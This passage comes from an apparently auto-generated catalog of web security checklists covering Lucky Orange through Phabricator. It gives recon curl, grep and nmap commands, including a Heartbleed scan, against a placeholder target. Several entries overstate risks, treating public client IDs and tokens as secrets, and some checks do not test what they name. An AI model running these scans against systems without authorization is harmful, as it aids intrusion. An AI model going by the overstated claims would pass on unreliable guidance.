Lucky Orange site ID in JavaScript allows third parties to access session recordings and heatmaps.

**Commands:**
```bash
curl -s http://target.com | grep -i "luckyorange\|lo"
```

**References:**
- https://www.luckyorange.com/security

---

## Lua
<!-- id: lua | icon: 🛠️ | color: #e06c75 -->
Security checklists for Lua scripting language.

### Check Lua for exposed source code
<!-- id: lua-1 | severity: medium | tags: lua, scripting, source-code, info-disclosure -->
Lua applications may expose source files (`.lua`) on the server, revealing business logic and credentials.

**Commands:**
```bash
curl -s http://target.com/scripts/config.lua
curl -s http://target.com | grep -i "\.lua"
```

**References:**
- https://www.lua.org/security.html

---

## Lucene
<!-- id: lucene | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache Lucene search library.

### Check Lucene for exposed search endpoints
<!-- id: lucene-1 | severity: high | tags: lucene, search, java, info-disclosure -->
Lucene search endpoints may be vulnerable to query injection and data exposure through search results.

**Commands:**
```bash
curl -s http://target.com/solr/admin/cores
curl -s http://target.com/search?q=*
```

**References:**
- https://lucene.apache.org/security/

---

## MDBootstrap
<!-- id: mdbootstrap | icon: 🛠️ | color: #e06c75 -->
Security checklists for MDBootstrap UI framework.

### Check MDBootstrap for exposed version info
<!-- id: mdbootstrap-1 | severity: low | tags: mdbootstrap, ui, framework, frontend -->
MDBootstrap version identifiers in CSS/JS files may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "mdbootstrap\|mdb\." | head -10
```

**References:**
- https://mdbootstrap.com/security/

---

## MODX
<!-- id: modx | icon: 🛠️ | color: #e06c75 -->
Security checklists for MODX CMS.

### Check MODX for exposed manager endpoints
<!-- id: modx-1 | severity: high | tags: modx, cms, manager, admin -->
MODX manager (`/manager/`) exposed to the internet allows brute-force attacks on admin credentials.

**Commands:**
```bash
curl -s http://target.com/manager/
curl -s http://target.com/connectors/
```

**References:**
- https://modx.com/security

---

## MUI
<!-- id: mui | icon: 🛠️ | color: #e06c75 -->
Security checklists for MUI (Material UI) React framework.

### Check MUI for exposed component internals
<!-- id: mui-1 | severity: low | tags: mui, react, ui, framework, frontend -->
MUI data attributes and class names in rendered HTML may reveal component structure and application patterns.

**Commands:**
```bash
curl -s http://target.com | grep -i "mui\|Mui" | head -20
```

**References:**
- https://mui.com/security/

---

## MailChimp
<!-- id: mailchimp | icon: 🛠️ | color: #e06c75 -->
Security checklists for MailChimp email marketing platform.

### Check MailChimp for exposed API keys
<!-- id: mailchimp-1 | severity: critical | tags: mailchimp, email, marketing, api-key -->
MailChimp API keys in client-side JavaScript expose subscriber lists, campaign data, and email automation settings.

**Commands:**
```bash
curl -s http://target.com | grep -i "mailchimp\|mc-"
```

**References:**
- https://mailchimp.com/security/

---

## MailerLite
<!-- id: mailerlite | icon: 🛠️ | color: #e06c75 -->
Security checklists for MailerLite email marketing platform.

### Check MailerLite for exposed API tokens
<!-- id: mailerlite-1 | severity: high | tags: mailerlite, email, marketing, api-key -->
MailerLite API tokens in client-side code allow unauthorized access to subscriber data and email campaigns.

**Commands:**
```bash
curl -s http://target.com | grep -i "mailerlite"
```

**References:**
- https://www.mailerlite.com/security/

---

## Mailgun
<!-- id: mailgun | icon: 🛠️ | color: #e06c75 -->
Security checklists for Mailgun email API service.

### Check Mailgun for exposed API keys
<!-- id: mailgun-1 | severity: critical | tags: mailgun, email, api, api-key -->
Mailgun API keys in client-side code allow unauthorized email sending and account management.

**Commands:**
```bash
curl -s http://target.com | grep -i "mailgun\|mg-"
```

**References:**
- https://www.mailgun.com/security/

---

## Mailjet
<!-- id: mailjet | icon: 🛠️ | color: #e06c75 -->
Security checklists for Mailjet email platform.

### Check Mailjet for exposed API credentials
<!-- id: mailjet-1 | severity: high | tags: mailjet, email, api-key -->
Mailjet API credentials exposed in client code allow unauthorized email campaigns and account data access.

**Commands:**
```bash
curl -s http://target.com | grep -i "mailjet"
```

**References:**
- https://www.mailjet.com/security/

---

## ManyChat
<!-- id: manychat | icon: 🛠️ | color: #e06c75 -->
Security checklists for ManyChat chatbot platform.

### Check ManyChat for exposed API tokens
<!-- id: manychat-1 | severity: medium | tags: manychat, chatbot, messaging, api-key -->
ManyChat API tokens in client-side JavaScript allow unauthorized chatbot flow management and subscriber data access.

**Commands:**
```bash
curl -s http://target.com | grep -i "manychat"
```

**References:**
- https://manychat.com/security/

---

## Mapbox GL JS
<!-- id: mapbox-gl-js | icon: 🛠️ | color: #e06c75 -->
Security checklists for Mapbox GL JS mapping library.

### Check Mapbox GL JS for exposed access tokens
<!-- id: mapbox-gl-js-1 | severity: high | tags: mapbox, maps, javascript, api-key -->
Mapbox access tokens in client-side code allow unauthorized map tile usage and may incur charges.

**Commands:**
```bash
curl -s http://target.com | grep -i "mapbox\|pk\."
```

**References:**
- https://docs.mapbox.com/security/

---

## MariaDB
<!-- id: mariadb | icon: 🛠️ | color: #e06c75 -->
Security checklists for MariaDB database.

### Check MariaDB for exposed ports
<!-- id: mariadb-1 | severity: critical | tags: mariadb, database, port-exposure -->
MariaDB default port 3306 exposed to the internet allows brute-force attacks and data theft.

**Commands:**
```bash
nmap -p 3306 target.com
```

**References:**
- https://mariadb.com/security/

---

## Marionette.js
<!-- id: marionette-js | icon: 🛠️ | color: #e06c75 -->
Security checklists for Marionette.js framework.

### Check Marionette.js for exposed app structure
<!-- id: marionette-js-1 | severity: low | tags: marionette, javascript, framework, backbone -->
Marionette.js application modules and views in client-side code reveal application structure and API endpoints.

**Commands:**
```bash
curl -s http://target.com | grep -i "marionette\|Mn"
```

**References:**
- https://marionettejs.com/

---

## Marketo
<!-- id: marketo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Marketo marketing automation.

### Check Marketo for exposed munchkin ID
<!-- id: marketo-1 | severity: medium | tags: marketo, marketing, automation, munchkin -->
Marketo Munchkin ID in JavaScript reveals the account instance and enables tracking data access.

**Commands:**
```bash
curl -s http://target.com | grep -i "marketo\|munchkin"
```

**References:**
- https://www.marketo.com/security/

---

## Mastodon
<!-- id: mastodon | icon: 🛠️ | color: #e06c75 -->
Security checklists for Mastodon social network.

### Check Mastodon for exposed instance info
<!-- id: mastodon-1 | severity: low | tags: mastodon, social, federated, info-disclosure -->
Mastodon instance API exposes user counts, peer instances, and software version information.

**Commands:**
```bash
curl -s http://target.com/api/v1/instance
curl -s http://target.com/api/v1/peers
```

**References:**
- https://docs.joinmastodon.org/security/

---

## Materialize CSS
<!-- id: materialize-css | icon: 🛠️ | color: #e06c75 -->
Security checklists for Materialize CSS framework.

### Check Materialize CSS for version exposure
<!-- id: materialize-css-1 | severity: low | tags: materialize, css, framework, frontend -->
Materialize CSS version identifiers in CSS/JS files reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "materialize\|materialize.min"
```

**References:**
- https://materializecss.com/

---

## MathJax
<!-- id: mathjax | icon: 🛠️ | color: #e06c75 -->
Security checklists for MathJax math rendering library.

### Check MathJax for exposed configuration
<!-- id: mathjax-1 | severity: low | tags: mathjax, javascript, math, rendering -->
MathJax configuration may expose custom extensions and internal content delivery paths.

**Commands:**
```bash
curl -s http://target.com | grep -i "mathjax\|MathJax"
```

**References:**
- https://www.mathjax.org/security/

---

## Matomo Analytics
<!-- id: matomo-analytics | icon: 🛠️ | color: #e06c75 -->
Security checklists for Matomo analytics platform.

### Check Matomo for exposed tracking endpoints
<!-- id: matomo-analytics-1 | severity: medium | tags: matomo, analytics, piwik, tracking -->
Matomo tracking API and optional admin interface may reveal site statistics and visitor data.

**Commands:**
```bash
curl -s http://target.com/piwik.php
curl -s http://target.com/matomo/
```

**References:**
- https://matomo.org/security/

---

## Mautic
<!-- id: mautic | icon: 🛠️ | color: #e06c75 -->
Security checklists for Mautic marketing automation.

### Check Mautic for exposed admin endpoints
<!-- id: mautic-1 | severity: high | tags: mautic, marketing, automation, admin -->
Mautic admin interface exposed allows unauthorized access to marketing data and contact information.

**Commands:**
```bash
curl -s http://target.com/mautic/
```

**References:**
- https://www.mautic.org/security

---

## Medium
<!-- id: medium | icon: 🛠️ | color: #e06c75 -->
Security checklists for Medium publishing platform.

### Check Medium for embedded stories exposure
<!-- id: medium-1 | severity: low | tags: medium, blogging, embed, info-disclosure -->
Medium embedded stories and publications may reveal draft content and unpublished member-only stories.

**Commands:**
```bash
curl -s http://target.com | grep -i "medium\.com\|embed/medium"
```

**References:**
- https://medium.com/policy/medium-security-policy

---

## Meilisearch
<!-- id: meilisearch | icon: 🛠️ | color: #e06c75 -->
Security checklists for Meilisearch search engine.

### Check Meilisearch for exposed API key
<!-- id: meilisearch-1 | severity: critical | tags: meilisearch, search, api-key -->
Meilisearch API key exposed allows full read/write access to search indexes and document data.

**Commands:**
```bash
curl -s http://target.com:7700/keys
curl -s http://target.com/indexes
```

**References:**
- https://docs.meilisearch.com/security/

---

## Mendix
<!-- id: mendix | icon: 🛠️ | color: #e06c75 -->
Security checklists for Mendix low-code platform.

### Check Mendix for exposed app endpoints
<!-- id: mendix-1 | severity: high | tags: mendix, low-code, app, info-disclosure -->
Mendix application endpoints may expose runtime data, microflow APIs, and deployment configurations.

**Commands:**
```bash
curl -s http://target.com/rest/
curl -s http://target.com/xas/
```

**References:**
- https://www.mendix.com/security/

---

## Meteor
<!-- id: meteor | icon: 🛠️ | color: #e06c75 -->
Security checklists for Meteor web framework.

### Check Meteor for exposed DDP endpoints
<!-- id: meteor-1 | severity: high | tags: meteor, javascript, framework, ddp -->
Meteor DDP (Distributed Data Protocol) endpoints may expose database collections and real-time data streams.

**Commands:**
```bash
curl -s http://target.com/sockjs/
curl -s http://target.com/websocket
```

**References:**
- https://docs.meteor.com/security.html

---

## Microsoft 365
<!-- id: microsoft-365 | icon: 🛠️ | color: #e06c75 -->
Security checklists for Microsoft 365 cloud suite.

### Check Microsoft 365 for exposed endpoints
<!-- id: microsoft-365-1 | severity: medium | tags: microsoft365, cloud, office, subdomains -->
Microsoft 365 tenant subdomains and endpoints reveal portal login, Exchange, and SharePoint availability.

**Commands:**
```bash
curl -s https://target-com.sharepoint.com/
curl -s https://target-com.onmicrosoft.com/
```

**References:**
- https://learn.microsoft.com/en-us/security/

---

## Microsoft ASP.NET
<!-- id: microsoft-aspnet | icon: 🛠️ | color: #e06c75 -->
Security checklists for Microsoft ASP.NET framework.

### Check ASP.NET for version disclosure
<!-- id: microsoft-aspnet-1 | severity: medium | tags: aspnet, dotnet, framework, info-disclosure -->
ASP.NET version headers and viewstate data reveal framework version for targeted exploit identification.

**Commands:**
```bash
curl -sI http://target.com | grep -i "asp.net\|x-aspnet"
```

**References:**
- https://learn.microsoft.com/en-us/aspnet/security/

---

## Microsoft Clarity
<!-- id: microsoft-clarity | icon: 🛠️ | color: #e06c75 -->
Security checklists for Microsoft Clarity analytics.

### Check Microsoft Clarity for exposed project ID
<!-- id: microsoft-clarity-1 | severity: medium | tags: clarity, microsoft, analytics, session-replay -->
Microsoft Clarity project ID in JavaScript allows third parties to access session recordings and heatmaps.

**Commands:**
```bash
curl -s http://target.com | grep -i "clarity\|msclarity"
```

**References:**
- https://clarity.microsoft.com/security

---

## Microsoft Power BI
<!-- id: microsoft-power-bi | icon: 🛠️ | color: #e06c75 -->
Security checklists for Microsoft Power BI.

### Check Power BI for exposed embed URLs
<!-- id: microsoft-power-bi-1 | severity: medium | tags: powerbi, microsoft, analytics, embed -->
Power BI embedded dashboard URLs may expose internal reports and business intelligence data.

**Commands:**
```bash
curl -s http://target.com | grep -i "powerbi\|power\s*bi"
```

**References:**
- https://learn.microsoft.com/en-us/power-bi/security/

---

## Midtrans
<!-- id: midtrans | icon: 🛠️ | color: #e06c75 -->
Security checklists for Midtrans payment gateway.

### Check Midtrans for exposed server key
<!-- id: midtrans-1 | severity: critical | tags: midtrans, payments, api-key, gateway -->
Midtrans server key in client-side code allows unauthorized payment transactions and refunds.

**Commands:**
```bash
curl -s http://target.com | grep -i "midtrans\|snap"
```

**References:**
- https://docs.midtrans.com/en/security/overview

---

## Mixpanel
<!-- id: mixpanel | icon: 🛠️ | color: #e06c75 -->
Security checklists for Mixpanel analytics platform.

### Check Mixpanel for exposed token
<!-- id: mixpanel-1 | severity: medium | tags: mixpanel, analytics, token, data-exposure -->
Mixpanel project token in client-side JavaScript allows unauthorized event tracking data access.

**Commands:**
```bash
curl -s http://target.com | grep -i "mixpanel"
```

**References:**
- https://mixpanel.com/security/

---

## MkDocs
<!-- id: mkdocs | icon: 🛠️ | color: #e06c75 -->
Security checklists for MkDocs documentation generator.

### Check MkDocs for exposed site files
<!-- id: mkdocs-1 | severity: medium | tags: mkdocs, documentation, info-disclosure -->
MkDocs generated sites may expose configuration files (mkdocs.yml) and draft documentation pages.

**Commands:**
```bash
curl -s http://target.com/mkdocs.yml
curl -s http://target.com/sitemap.xml
```

**References:**
- https://www.mkdocs.org/security/

---

## MobX
<!-- id: mobx | icon: 🛠️ | color: #e06c75 -->
Security checklists for MobX state management library.

### Check MobX for exposed state data
<!-- id: mobx-1 | severity: medium | tags: mobx, javascript, state-management, info-disclosure -->
MobX observable state in JavaScript may expose sensitive application data and API response objects.

**Commands:**
```bash
curl -s http://target.com | grep -i "mobx\|observable"
```

**References:**
- https://mobx.js.org/security.html

---

## Modernizr
<!-- id: modernizr | icon: 🛠️ | color: #e06c75 -->
Security checklists for Modernizr feature detection library.

### Check Modernizr for version disclosure
<!-- id: modernizr-1 | severity: low | tags: modernizr, javascript, frontend, info-disclosure -->
Modernizr version identifiers reveal outdated versions with potential known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "modernizr"
```

**References:**
- https://modernizr.com/security

---

## Mollie
<!-- id: mollie | icon: 🛠️ | color: #e06c75 -->
Security checklists for Mollie payment platform.

### Check Mollie for exposed API keys
<!-- id: mollie-1 | severity: critical | tags: mollie, payments, api-key, gateway -->
Mollie API keys in client-side code allow unauthorized payment processing and refund management.

**Commands:**
```bash
curl -s http://target.com | grep -i "mollie"
```

**References:**
- https://docs.mollie.com/security

---

## Moment.js
<!-- id: moment-js | icon: 🛠️ | color: #e06c75 -->
Security checklists for Moment.js date library.

### Check Moment.js for outdated version
<!-- id: moment-js-1 | severity: low | tags: momentjs, javascript, date, library -->
Moment.js outdated versions may have known vulnerabilities; library is also deprecated with limited security updates.

**Commands:**
```bash
curl -s http://target.com | grep -i "moment\|moment.min"
```

**References:**
- https://momentjs.com/docs/#/security/

---

## Monaco Editor
<!-- id: monaco-editor | icon: 🛠️ | color: #e06c75 -->
Security checklists for Monaco Editor code editor.

### Check Monaco Editor for exposed configuration
<!-- id: monaco-editor-1 | severity: low | tags: monaco, editor, code, javascript -->
Monaco Editor configuration in client-side code may reveal internal endpoints and file paths.

**Commands:**
```bash
curl -s http://target.com | grep -i "monaco\|monaco-editor"
```

**References:**
- https://microsoft.github.io/monaco-editor/

---

## MooTools
<!-- id: mootools | icon: 🛠️ | color: #e06c75 -->
Security checklists for MooTools JavaScript library.

### Check MooTools for outdated version
<!-- id: mootools-1 | severity: low | tags: mootools, javascript, library, outdated -->
MooTools outdated versions may have known vulnerabilities; library is largely unmaintained.

**Commands:**
```bash
curl -s http://target.com | grep -i "mootools\|moo."
```

**References:**
- https://mootools.net/

---

## Mustache
<!-- id: mustache | icon: 🛠️ | color: #e06c75 -->
Security checklists for Mustache templating library.

### Check Mustache for template injection
<!-- id: mustache-1 | severity: high | tags: mustache, templating, injection, server-side -->
Server-side Mustache template injection may allow remote code execution and data exposure through unescaped variables.

**Commands:**
```bash
curl -s http://target.com | grep -i "mustache\|\.mustache"
```

**References:**
- https://mustache.github.io/security.html

---

## Mux
<!-- id: mux | icon: 🛠️ | color: #e06c75 -->
Security checklists for Mux video platform.

### Check Mux for exposed API tokens
<!-- id: mux-1 | severity: high | tags: mux, video, api-key, streaming -->
Mux API tokens in client-side code allow unauthorized video asset management and streaming control.

**Commands:**
```bash
curl -s http://target.com | grep -i "mux\|mux-"
```

**References:**
- https://www.mux.com/security

---

## MySQL
<!-- id: mysql | icon: 🛠️ | color: #e06c75 -->
Security checklists for MySQL database.

### Check MySQL for exposed port
<!-- id: mysql-1 | severity: critical | tags: mysql, database, port-exposure -->
MySQL default port 3306 exposed to the internet allows brute-force attacks and data theft.

**Commands:**
```bash
nmap -p 3306 target.com
```

**References:**
- https://dev.mysql.com/doc/refman/en/security.html

---

## NetSuite
<!-- id: netsuite | icon: 🛠️ | color: #e06c75 -->
Security checklists for Oracle NetSuite ERP platform.

### Check NetSuite for exposed SuiteScript endpoints
<!-- id: netsuite-1 | severity: high | tags: netsuite, erp, oracle, api -->
NetSuite SuiteScript RESTlets and SuiteTalk web services may be accessible without proper authentication.

**Commands:**
```bash
curl -s http://target.com/site/suitescript/
curl -s http://target.com/site/servicemanagement/
```

**References:**
- https://www.netsuite.com/security/

---

## Netlify
<!-- id: netlify | icon: 🛠️ | color: #e06c75 -->
Security checklists for Netlify hosting platform.

### Check Netlify for exposed deploy keys and env vars
<!-- id: netlify-1 | severity: critical | tags: netlify, hosting, deploy, api-key -->
Netlify deploy keys and environment variables in CI/CD logs or client-side code expose infrastructure access.

**Commands:**
```bash
curl -s http://target.com | grep -i "netlify"
curl -sI http://target.com | grep -i "netlify\|server"
```

**References:**
- https://docs.netlify.com/security/

---

## New Relic
<!-- id: new-relic | icon: 🛠️ | color: #e06c75 -->
Security checklists for New Relic observability platform.

### Check New Relic for exposed license key
<!-- id: new-relic-1 | severity: high | tags: newrelic, monitoring, license-key, apm -->
New Relic license key in client-side JavaScript allows unauthorized data ingestion and may incur costs.

**Commands:**
```bash
curl -s http://target.com | grep -i "newrelic\|nr-"
```

**References:**
- https://docs.newrelic.com/docs/security/

---

## Next.js
<!-- id: nextjs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Next.js React framework.

### Check Next.js for exposed source maps
<!-- id: nextjs-1 | severity: high | tags: nextjs, react, framework, source-maps -->
Next.js source maps in production builds may expose server-side code, API routes, and internal logic.

**Commands:**
```bash
curl -s http://target.com/_next/static/chunks/pages/ -L
curl -s http://target.com/_next/data/
```

**References:**
- https://nextjs.org/docs/security

### Check Next.js for exposed API routes
<!-- id: nextjs-2 | severity: medium | tags: nextjs, api, routes, info-disclosure -->
Next.js API routes and server-side props may leak internal data and business logic.

**Commands:**
```bash
curl -s http://target.com/api/
```

**References:**
- https://nextjs.org/docs/security

---

## NextAuth.js
<!-- id: nextauth-js | icon: 🛠️ | color: #e06c75 -->
Security checklists for NextAuth.js authentication.

### Check NextAuth.js for exposed session data
<!-- id: nextauth-js-1 | severity: medium | tags: nextauth, authentication, session, jwt -->
NextAuth.js session tokens and JWT secrets may be exposed through client-side code and error messages.

**Commands:**
```bash
curl -s http://target.com/api/auth/session
curl -s http://target.com/api/auth/providers
```

**References:**
- https://next-auth.js.org/security

---

## NProgress
<!-- id: nprogress | icon: 🛠️ | color: #e06c75 -->
Security checklists for NProgress loading bar.

### Check NProgress for version exposure
<!-- id: nprogress-1 | severity: low | tags: nprogress, javascript, progress, frontend -->
NProgress version identifiers in JS files may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "nprogress"
```

**References:**
- https://github.com/rstacruz/nprogress

---

## Notion
<!-- id: notion | icon: 🛠️ | color: #e06c75 -->
Security checklists for Notion workspace platform.

### Check Notion for exposed public pages
<!-- id: notion-1 | severity: medium | tags: notion, workspace, collaboration, info-disclosure -->
Notion public pages and shared databases may leak internal documentation, credentials, and project data.

**Commands:**
```bash
curl -s http://target.com | grep -i "notion\.so\|notion\."
```

**References:**
- https://www.notion.so/security

---

## Normalize.css
<!-- id: normalize-css | icon: 🛠️ | color: #e06c75 -->
Security checklists for Normalize.css stylesheet.

### Check Normalize.css for version exposure
<!-- id: normalize-css-1 | severity: low | tags: normalize, css, frontend, library -->
Normalize.css version identifiers in CSS files reveal outdated versions with potential known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "normalize\|normalize.min"
```

**References:**
- https://necolas.github.io/normalize.css/

---

## Nuxt.js
<!-- id: nuxtjs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Nuxt.js Vue framework.

### Check Nuxt.js for exposed server-side data
<!-- id: nuxtjs-1 | severity: high | tags: nuxt, vue, framework, ssr -->
Nuxt.js server-side rendered pages may leak API payloads and server state through the `__NUXT__` global.

**Commands:**
```bash
curl -s http://target.com | grep -i "__NUXT__\|nuxt"
```

**References:**
- https://nuxt.com/docs/security

---

## October CMS
<!-- id: october-cms | icon: 🛠️ | color: #e06c75 -->
Security checklists for October CMS.

### Check October CMS for exposed admin panel
<!-- id: october-cms-1 | severity: high | tags: octobercms, cms, admin, backend -->
October CMS admin panel (`/backend`) exposed allows brute-force attacks on admin credentials.

**Commands:**
```bash
curl -s http://target.com/backend/
```

**References:**
- https://octobercms.com/security

---

## Olark
<!-- id: olark | icon: 🛠️ | color: #e06c75 -->
Security checklists for Olark live chat platform.

### Check Olark for exposed site ID
<!-- id: olark-1 | severity: low | tags: olark, chat, site-id, livechat -->
Olark site ID in JavaScript allows third parties to identify the chat account and operator availability.

**Commands:**
```bash
curl -s http://target.com | grep -i "olark"
```

**References:**
- https://www.olark.com/security/

---

## OneSignal
<!-- id: onesignal | icon: 🛠️ | color: #e06c75 -->
Security checklists for OneSignal push notification platform.

### Check OneSignal for exposed app ID
<!-- id: onesignal-1 | severity: medium | tags: onesignal, push, notifications, app-id -->
OneSignal app ID in client-side code allows third parties to send push notifications to the app's subscribers.

**Commands:**
```bash
curl -s http://target.com | grep -i "onesignal"
```

**References:**
- https://onesignal.com/security

---

## OneTrust
<!-- id: onetrust | icon: 🛠️ | color: #e06c75 -->
Security checklists for OneTrust privacy platform.

### Check OneTrust for exposed domain data
<!-- id: onetrust-1 | severity: low | tags: onetrust, privacy, consent, cookies -->
OneTrust cookie consent banner IDs may reveal privacy policy details and data processing activities.

**Commands:**
```bash
curl -s http://target.com | grep -i "onetrust\|ot-"
```

**References:**
- https://www.onetrust.com/security/

---

## OpenLayers
<!-- id: openlayers | icon: 🛠️ | color: #e06c75 -->
Security checklists for OpenLayers mapping library.

### Check OpenLayers for exposed tile URLs
<!-- id: openlayers-1 | severity: medium | tags: openlayers, maps, javascript, api-key -->
OpenLayers tile source URLs in client-side code may contain API keys and internal tile server endpoints.

**Commands:**
```bash
curl -s http://target.com | grep -i "openlayers\|ol\."
```

**References:**
- https://openlayers.org/security/

---

## OpenResty
<!-- id: openresty | icon: 🛠️ | color: #e06c75 -->
Security checklists for OpenResty web platform.

### Check OpenResty for server header disclosure
<!-- id: openresty-1 | severity: low | tags: openresty, nginx, lua, webserver -->
OpenResty server header reveals the platform version for targeted exploit identification.

**Commands:**
```bash
curl -sI http://target.com | grep -i "openresty\|server"
```

**References:**
- https://openresty.org/en/security.html

---

## OpenSSL
<!-- id: openssl | icon: 🛠️ | color: #e06c75 -->
Security checklists for OpenSSL cryptographic library.

### Check OpenSSL for weak TLS configuration
<!-- id: openssl-1 | severity: high | tags: openssl, tls, ssl, cryptography -->
OpenSSL-powered servers with outdated versions may be vulnerable to Heartbleed and other TLS attacks.

**Commands:**
```bash
nmap --script ssl-heartbleed -p 443 target.com
nmap --script ssl-enum-ciphers -p 443 target.com
```

**References:**
- https://www.openssl.org/security/

---

## OpenStreetMap
<!-- id: openstreetmap | icon: 🛠️ | color: #e06c75 -->
Security checklists for OpenStreetMap tiles.

### Check OpenStreetMap for tile usage tracking
<!-- id: openstreetmap-1 | severity: low | tags: openstreetmap, maps, tiles, osint -->
OpenStreetMap tiles embedded on pages reveal geographic context for OSINT and footprint gathering.

**Commands:**
```bash
curl -s http://target.com | grep -i "openstreetmap\|tile\.openstreetmap"
```

**References:**
- https://operations.osmfoundation.org/policies/tiles/

---

## Optimizely
<!-- id: optimizely | icon: 🛠️ | color: #e06c75 -->
Security checklists for Optimizely experimentation platform.

### Check Optimizely for exposed project ID
<!-- id: optimizely-1 | severity: medium | tags: optimizely, a/b-testing, experimentation, project-id -->
Optimizely project ID in JavaScript allows third parties to identify experiments and variation data.

**Commands:**
```bash
curl -s http://target.com | grep -i "optimizely"
```

**References:**
- https://www.optimizely.com/security/

---

## OutSystems
<!-- id: outsystems | icon: 🛠️ | color: #e06c75 -->
Security checklists for OutSystems low-code platform.

### Check OutSystems for exposed environment URLs
<!-- id: outsystems-1 | severity: medium | tags: outsystems, low-code, platform, info-disclosure -->
OutSystems environment URLs (e.g. `outsystemscloud.com`) reveal development, test, and production instances.

**Commands:**
```bash
curl -s http://target.com/ServiceCenter/
```

**References:**
- https://www.outsystems.com/security/

---

## OVHcloud
<!-- id: ovhcloud | icon: 🛠️ | color: #e06c75 -->
Security checklists for OVHcloud hosting infrastructure.

### Check OVHcloud for origin IP exposure
<!-- id: ovhcloud-1 | severity: high | tags: ovhcloud, hosting, cloud, origin-exposure -->
OVHcloud-backed servers may expose origin IP addresses through misconfigured DNS and SPF records.

**Commands:**
```bash
dig +short target.com A
dig +short target.com MX
```

**References:**
- https://www.ovhcloud.com/security/

---

## OWL Carousel
<!-- id: owl-carousel | icon: 🛠️ | color: #e06c75 -->
Security checklists for OWL Carousel slider library.

### Check OWL Carousel for version exposure
<!-- id: owl-carousel-1 | severity: low | tags: owlcarousel, javascript, slider, frontend -->
OWL Carousel version identifiers in JS files may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "owlcarousel\|owl\.carousel"
```

**References:**
- https://owlcarousel2.github.io/OwlCarousel2/

---

## Pantheon
<!-- id: pantheon | icon: 🛠️ | color: #e06c75 -->
Security checklists for Pantheon web hosting platform.

### Check Pantheon for environment exposure
<!-- id: pantheon-1 | severity: medium | tags: pantheon, hosting, cms, info-disclosure -->
Pantheon environment URLs may expose development, test, and live instances for targeted attacks.

**Commands:**
```bash
curl -sI http://target.com | grep -i "pantheon\|x-pantheon"
```

**References:**
- https://pantheon.io/security

---

## Parse Platform
<!-- id: parse-platform | icon: 🛠️ | color: #e06c75 -->
Security checklists for Parse Platform backend framework.

### Check Parse Platform for exposed API keys
<!-- id: parse-platform-1 | severity: high | tags: parse, backend, api, baaS -->
Parse Platform exposed application ID and JavaScript key in client-side code allow unauthorized API access.

**Commands:**
```bash
curl -s http://target.com/parse | grep -i "parse\|app-id"
```

**References:**
- https://parseplatform.org/security/

---

## Parsley.js
<!-- id: parsleyjs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Parsley.js form validation library.

### Check Parsley.js for exposed validation logic
<!-- id: parsleyjs-1 | severity: low | tags: parsley, javascript, form-validation, frontend -->
Parsley.js client-side validation rules may reveal backend validation expectations and field constraints.

**Commands:**
```bash
curl -s http://target.com | grep -i "parsley\|parsley\.min"
```

**References:**
- https://parsleyjs.org/

---

## Partytown
<!-- id: partytown | icon: 🛠️ | color: #e06c75 -->
Security checklists for Partytown third-party script runner.

### Check Partytown for exposed configuration
<!-- id: partytown-1 | severity: medium | tags: partytown, webworker, third-party, performance -->
Partytown config reveals third-party script URLs and forwarding directives that may leak data to external services.

**Commands:**
```bash
curl -s http://target.com | grep -i "partytown\|__PARTYTOWN__"
```

**References:**
- https://partytown.builder.io/security

---

## Passport.js
<!-- id: passportjs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Passport.js authentication middleware.

### Check Passport.js for exposed authentication endpoints
<!-- id: passportjs-1 | severity: high | tags: passport, nodejs, auth, middleware -->
Passport.js authentication strategies may expose SSO callback URLs and OAuth provider configurations.

**Commands:**
```bash
curl -s http://target.com | grep -i "passport\|auth/callback"
```

**References:**
- https://www.passportjs.org/security/

---

## Patreon
<!-- id: patreon | icon: 🛠️ | color: #e06c75 -->
Security checklists for Patreon membership platform.

### Check Patreon for exposed campaign data
<!-- id: patreon-1 | severity: medium | tags: patreon, membership, crowdfunding, api -->
Patreon API keys and webhook URLs exposed in client-side code allow unauthorized campaign access.

**Commands:**
```bash
curl -s http://target.com | grep -i "patreon"
```

**References:**
- https://www.patreon.com/security

---

## PayPal
<!-- id: paypal | icon: 🛠️ | color: #e06c75 -->
Security checklists for PayPal payment platform.

### Check PayPal for exposed client ID
<!-- id: paypal-1 | severity: high | tags: paypal, payment, checkout, api-key -->
PayPal client ID in client-side code allows third parties to initiate unauthorized payment flows.

**Commands:**
```bash
curl -s http://target.com | grep -i "paypal\|client-id"
```

**References:**
- https://developer.paypal.com/security/

---

## PDF.js
<!-- id: pdfjs | icon: 🛠️ | color: #e06c75 -->
Security checklists for PDF.js document viewer.

### Check PDF.js for version exposure
<!-- id: pdfjs-1 | severity: medium | tags: pdfjs, pdf, viewer, javascript -->
PDF.js version identifiers in script URLs reveal outdated versions with potential XSS and RCE vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "pdf\.js\|pdf\.min\.js"
```

**References:**
- https://github.com/mozilla/pdf.js/security

---

## Pendo
<!-- id: pendo | icon: 🠠️ | color: #e06c75 -->
Security checklists for Pendo product analytics platform.

### Check Pendo for exposed API key
<!-- id: pendo-1 | severity: medium | tags: pendo, analytics, product, tracking -->
Pendo API key in client-side JavaScript allows unauthorized access to product analytics data.

**Commands:**
```bash
curl -s http://target.com | grep -i "pendo"
```

**References:**
- https://www.pendo.io/security/

---

## Perl
<!-- id: perl | icon: 🛠️ | color: #e06c75 -->
Security checklists for Perl scripting language.

### Check Perl for exposed CGI scripts
<!-- id: perl-1 | severity: high | tags: perl, cgi, scripting, server -->
Perl CGI scripts exposed on the server may reveal source code and allow command injection attacks.

**Commands:**
```bash
curl -s http://target.com/cgi-bin/
curl -s http://target.com | grep -i "\.pl\|\.cgi"
```

**References:**
- https://perldoc.perl.org/perlsec

---

## Phabricator
<!-- id: phabricator | icon: 🛠️ | color: #e06c75 -->
Security checklists for Phabricator code review platform.

### Check Phabricator for exposed instance
